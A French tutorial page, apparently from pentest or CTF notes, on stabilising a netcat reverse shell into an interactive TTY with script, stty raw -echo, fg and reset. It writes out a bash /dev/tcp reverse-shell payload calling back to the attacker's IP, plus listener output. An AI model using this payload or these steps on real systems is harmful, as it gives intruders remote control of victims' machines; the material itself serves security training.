---
title: Obtenir un shell propre
sidebar_label: Obtenir un shell propre
pagination_label: Obtenir un shell propre
description: Après avoir injecté votre payload, vous obtenez un reverse shell depuis la commande netcat. Comment améliorer ce shell ?
keywords:
  - docs
  - Reverse shell
  - Netcat
  - Payload
---

## Pourquoi améliorer son reverse shell ?

Tout d'abord, si vous n'êtes pas encore à l'aise avec l'injection de reverse shell, je vous suggère de consulter [ce lien](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) pour avoir une liste de payloads à injecter.

Lorsque vous injectez votre payload (exemple: `bash -c 'bash -i >& /dev/tcp/[votre IP]/[port d'ecoute de netcat] 0>&1'`), vous obtenez un reverse shell depuis la commande netcat.

Cependant, ce shell est très limité, vous aurez donc rapidement envie de l'améliorer.

Par exemple il est impossible d'utiliser les flèches pour naviguer dans l'historique des commandes, ou encore d'interrrompre une commande avec `Ctrl+C`.

```bash
user@local$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.104] from (UNKNOWN) [10.10.11.211] 36734
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ ^C
user@local$
```

## Comment améliorer son reverse shell ?

### Attacher le shell à un terminal

Pour améliorer votre shell, vous pouvez utiliser la commande `script` pour attacher votre shell à un terminal.

Depuis le shell de la victime, exécutez la commande suivante :

```bash
bash-5.1$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
bash-5.1$
```

Vous obtenez ainsi un second shell, attaché cette fois au TTY.

### Mettre à niveau le shell

Il faut maintenant indiquer à notre terminal local d'enregistrer les entrées clavier et de les envoyer au shell distant.

Mettez d'abord le shell distant en arrirère-plan avec `Ctrl+Z`.

```bash
bash-5.1$ ^Z
[1]+  Stopped                 nc -lvnp 4444
```

Utilisez la commande `stty raw -echo` depuis le shell local: cela permet de désactiver l'affichage des caractères saisis et de les envoyer directement au shell distant.

Remettez le shell distant au premier plan avec `fg`.

```bash
user@local$ stty raw -echo ; fg
```

Pour remettre le curseur au bon endroit, utilisez la commande `reset`.

```bash
user@local$ stty raw -echo ; fg
nc -lnvp 4444
             reset
```

Si le type de terminal n'est pas reconnu, indiquez `screen`.

```bash
user@local$ stty raw -echo ; fg
nc -lnvp 4444
            reset
reset: unknown terminal type unknown
Terminal type? screen
```

Vous avez maintenant accès à un shell complètement interactif, dans lequel vous pouvez utiliser les flèches pour naviguer dans l'historique des commandes, ou encore interrompre une commande avec `Ctrl+C`.

```bash
bash-5.1$ ^C
bash-5.1$ ^C
bash-5.1$
```

### Remettre le terminal local à ses valeurs par défaut

Pour quitter le shell distant, utilisez la commande `exit`.
Vous quitterz dans un premier temps le shell attaché au terminal TTY, puis tapez `exit` une seconde fois pour quitter le premier reverse shell.

```bash
bash-5.1$ exit
exit
Script done.
            bash-5.1$ exit
                          exit
user@local$
```

Depuis le shell local, **vous ne voyez plus apparaître les caractères saisis** (puisque vous avez désactivé l'affichage local avec `stty raw -echo`), utilisez la commande `stty sane` pour remettre le terminal à ses valeurs par défaut.

```bash
user@local$ stty sane # Vous tapez la commande sans la voir
user@local$ echo "salut" # Le terminal est remis à ses valeurs par défaut
salut
user@local$
```
